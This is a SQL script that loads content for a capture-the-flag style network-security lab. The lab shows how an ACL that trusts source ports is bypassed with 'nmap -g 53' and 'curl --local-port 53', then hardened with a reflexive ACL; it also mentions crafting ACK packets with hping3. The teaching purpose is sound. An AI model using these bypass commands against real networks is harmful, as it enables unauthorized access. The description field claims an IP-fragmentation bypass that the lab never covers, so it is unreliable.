-- ═══════════════════════════════════════════════════════
-- Lab 06 (id=6) — ACL Bypass Mission : full content (Vol 2 · Ch 7)
-- ═══════════════════════════════════════════════════════

UPDATE labs
SET short_desc = 'Configure standard and extended ACLs then bypass them with IP fragmentation.',
    topic = 'security',
    difficulty = 'medium',
    book_ref = 'Vol 2 · Ch 7'
WHERE id = 6;

-- ─────────────────────────── BUILD ───────────────────────────
UPDATE lab_phases SET
  title = 'A filter that trusts source ports',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Build</span><h3>A filter that trusts source ports</h3></div>
    <p class="goal">R1 guards the internal server with an inbound ACL that permits "return traffic" by source port — the well-intentioned mistake this lab exists to puncture.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> The vulnerable ACL</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1(config)#</span> ip access-list extended OUTSIDE-IN
<span class="prompt">R1(config-ext-nacl)#</span>  permit udp any eq 53 any     <span class="cmt"># "allow DNS replies"</span>
<span class="prompt">R1(config-ext-nacl)#</span>  permit tcp any eq 53 any
<span class="prompt">R1(config-ext-nacl)#</span>  permit tcp any eq 80 any     <span class="cmt"># "allow web replies"</span>
<span class="prompt">R1(config-ext-nacl)#</span>  deny ip any any log
<span class="prompt">R1(config)#</span> interface f0/0
<span class="prompt">R1(config-if)#</span>  ip access-group OUTSIDE-IN in</pre>
      <div class="note why"><strong>The flaw in one line:</strong> <code>eq 53</code> after the source matches the <em>source</em> port. The rule permits any inbound packet that merely claims to come from port 53 — and the sender picks their own source port.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Confirm a normal scan is blocked</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">kali$</span> nmap -sS 10.0.20.10
<span class="cmt">All 1000 scanned ports are filtered   ← default source ports hit the deny. Good.</span></pre>
    </div>
  </div>

  <!-- ATTACK -->
$md$
WHERE lab_id = 6 AND phase = 'build';

-- ─────────────────────────── ATTACK ───────────────────────────
UPDATE lab_phases SET
  title = 'Send from the trusted port',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Attack</span><h3>Send from the trusted port</h3></div>
    <p class="goal">Set your source port to 53 and the ACL waves you through. Every packet now matches the "DNS replies" permit — including your scan and your data connection.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> Source-port scan straight through the filter</div>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ nmap -sS -g 53 10.0.20.10</span>   <span class="cmt"># -g / --source-port = 53</span>
<span class="cmt">PORT   STATE  SERVICE
80/tcp open   http     ← the ACL let it through</span></pre>
      <div class="note watch"><strong>Same field, whole connection:</strong> the scan works because the SYN carries source port 53. To pull data you need the entire TCP session to use it — bind the local port on your client too.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Reach the internal service and take the flag</div>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ curl --local-port 53 http://10.0.20.10/flag</span>
<span class="cmt">NB6-p0rt53-byp4ss-9e1d</span></pre>
    </div>
    <div class="flag">
      <div class="flag-label">🚩 Flag</div>
      <h4>Reach the internal server that a normal scan couldn't touch.</h4>
      <div class="flag-row"><input id="flag-in" placeholder="NB6-..."><button onclick="checkFlag()">Submit</button></div>
      <div class="flag-msg" id="flag-msg"></div>
    </div>
    <details class="hint"><summary>Hint 1 — scan gets through but curl still fails</summary>
      <p>The scan only needs the SYN to carry source port 53; a full data transfer needs <em>every</em> packet from your side to. <code>nmap -g</code> sets it for the scan, but <code>curl</code> needs <code>--local-port 53</code> to bind its source port. Without that, your data connection uses a random high port and hits the deny.</p></details>
    <details class="hint"><summary>Hint 2 — why 53 and not something else?</summary>
      <p>Any source port the ACL permits works — 53, 80, 20 (FTP-data), 123 (NTP). Admins add these thinking "these are safe return-traffic ports." Try 80 if 53 is filtered elsewhere. The lesson isn't the number; it's that a source port is attacker-chosen and proves nothing.</p></details>
  </div>

  <!-- HARDEN -->
$md$
WHERE lab_id = 6 AND phase = 'attack';

-- ─────────────────────────── HARDEN ───────────────────────────
UPDATE lab_phases SET
  title = 'Track sessions, don''t trust fields',
  is_pro_only = false,
  content = $md$
<div class="phase-head"><span class="phase-tag">Harden</span><h3>Track sessions, don't trust fields</h3></div>
    <p class="goal">Stop permitting by port and start permitting by <em>state</em>: a reflexive ACL lets return traffic in only if it matches a session the inside actually started. There's no outbound session behind Kali's crafted packets, so they're denied.</p>
    <div class="step">
      <div class="step-label"><span class="n">1</span> Reflexive ACL — reflect outbound, evaluate inbound</div>
      <pre><button class="copy-btn">copy</button><span class="prompt">R1(config)#</span> ip access-list extended INSIDE-OUT
<span class="prompt">R1(config-ext-nacl)#</span>  permit tcp 10.0.20.0 0.0.0.255 any reflect MIRROR
<span class="prompt">R1(config-ext-nacl)#</span>  permit udp 10.0.20.0 0.0.0.255 any reflect MIRROR
<span class="prompt">R1(config)#</span> ip access-list extended OUTSIDE-IN
<span class="prompt">R1(config-ext-nacl)#</span>  evaluate MIRROR
<span class="prompt">R1(config-ext-nacl)#</span>  deny ip any any log
<span class="prompt">R1(config)#</span> interface f0/0
<span class="prompt">R1(config-if)#</span>  ip access-group OUTSIDE-IN in
<span class="prompt">R1(config-if)#</span>  ip access-group INSIDE-OUT out</pre>
      <div class="note why"><strong>Why the port trick dies:</strong> inbound packets are now evaluated against <code>MIRROR</code>, a table of sessions the inside genuinely initiated. Kali's source-port-53 packet matches no such session — nothing on the inside asked for it — so it's denied regardless of which port it claims.</div>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">2</span> Re-attack — both techniques fail</div>
      <pre><button class="copy-btn">copy</button><span class="attackline">kali$ nmap -sS -g 53 10.0.20.10</span>
<span class="cmt">All 1000 scanned ports are filtered</span>
<span class="attackline">kali$ curl --local-port 53 http://10.0.20.10/flag</span>
<span class="good">curl: (28) Connection timed out   ← no matching session. Denied.</span>

<span class="prompt">R1#</span> show ip access-lists OUTSIDE-IN
<span class="cmt">  deny ip any any log (42 matches)   ← the crafted packets landing on the deny</span></pre>
    </div>
    <div class="step">
      <div class="step-label"><span class="n">3</span> Know why <code>established</code> isn't enough</div>
      <div class="note trap"><strong>The tempting-but-weak fix:</strong> <code>permit tcp any any established</code> permits only TCP with ACK/RST set. But an attacker can <em>craft</em> an ACK packet — <code>nmap --scanflags ACK</code> or <code>hping3 -A</code> — and sail through, because <code>established</code> checks a flag, not a real session. Reflexive/stateful tracks the actual connection; that's why it's the right answer and <code>established</code> is the exam distractor.</div>
    </div>
  </div>
$md$
WHERE lab_id = 6 AND phase = 'harden';

-- ─────────────────────────── TOPOLOGY ───────────────────────────
INSERT INTO lab_topologies (lab_id, svg_small, svg_large, legend)
VALUES (
  6,
  $svg$<svg viewBox="0 0 720 250" role="img" aria-label="Kali outside, a router enforcing an inbound ACL, and an internal server behind it">
      <rect x="40" y="95" width="130" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="105" y="117" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="105" y="133" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#e5484d">outside · 203.0.113.66</text>
      <rect x="295" y="90" width="140" height="66" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="365" y="114" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R1</text>
      <text x="365" y="132" text-anchor="middle" font-family="monospace" font-size="9" fill="#64748b">ACL OUTSIDE-IN (in)</text>
      <text x="365" y="146" text-anchor="middle" font-family="monospace" font-size="9" fill="#64748b">c3725</text>
      <rect x="555" y="95" width="130" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="620" y="117" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">SERVER</text>
      <text x="620" y="133" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">10.0.20.10 · :80</text>
      <line x1="170" y1="123" x2="295" y2="123" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>
      <text x="232" y="114" text-anchor="middle" font-family="monospace" font-size="9" fill="#64748b">f0/0 · filtered</text>
      <line x1="435" y1="123" x2="555" y2="123" stroke="#2563eb" stroke-width="2"/>
      <text x="495" y="114" text-anchor="middle" font-family="monospace" font-size="9" fill="#64748b">f0/1 · inside</text>
      <text x="360" y="230" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">the inbound ACL is meant to block outside→inside except "replies" — that exception is the hole</text>
    </svg>$svg$,
  $svg$<svg viewBox="0 0 720 250" role="img" aria-label="Kali outside, a router enforcing an inbound ACL, and an internal server behind it">
      <rect x="40" y="95" width="130" height="56" rx="8" fill="#fef2f2" stroke="#e5484d" stroke-width="1.5"/>
      <text x="105" y="117" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#e5484d">KALI</text>
      <text x="105" y="133" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#e5484d">outside · 203.0.113.66</text>
      <rect x="295" y="90" width="140" height="66" rx="8" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
      <text x="365" y="114" text-anchor="middle" font-family="monospace" font-size="14" font-weight="700" fill="#2563eb">R1</text>
      <text x="365" y="132" text-anchor="middle" font-family="monospace" font-size="9" fill="#64748b">ACL OUTSIDE-IN (in)</text>
      <text x="365" y="146" text-anchor="middle" font-family="monospace" font-size="9" fill="#64748b">c3725</text>
      <rect x="555" y="95" width="130" height="56" rx="8" fill="#fff" stroke="#2563eb" stroke-width="1.5"/>
      <text x="620" y="117" text-anchor="middle" font-family="monospace" font-size="13" font-weight="700" fill="#0f172a">SERVER</text>
      <text x="620" y="133" text-anchor="middle" font-family="monospace" font-size="9.5" fill="#64748b">10.0.20.10 · :80</text>
      <line x1="170" y1="123" x2="295" y2="123" stroke="#e5484d" stroke-width="2" stroke-dasharray="6 4"/>
      <text x="232" y="114" text-anchor="middle" font-family="monospace" font-size="9" fill="#64748b">f0/0 · filtered</text>
      <line x1="435" y1="123" x2="555" y2="123" stroke="#2563eb" stroke-width="2"/>
      <text x="495" y="114" text-anchor="middle" font-family="monospace" font-size="9" fill="#64748b">f0/1 · inside</text>
      <text x="360" y="230" text-anchor="middle" font-family="monospace" font-size="10" fill="#94a3b8">the inbound ACL is meant to block outside→inside except "replies" — that exception is the hole</text>
    </svg>$svg$,
  '[]'::jsonb
)
ON CONFLICT (lab_id) DO UPDATE SET
  svg_small = EXCLUDED.svg_small,
  svg_large = EXCLUDED.svg_large,
  legend    = EXCLUDED.legend;
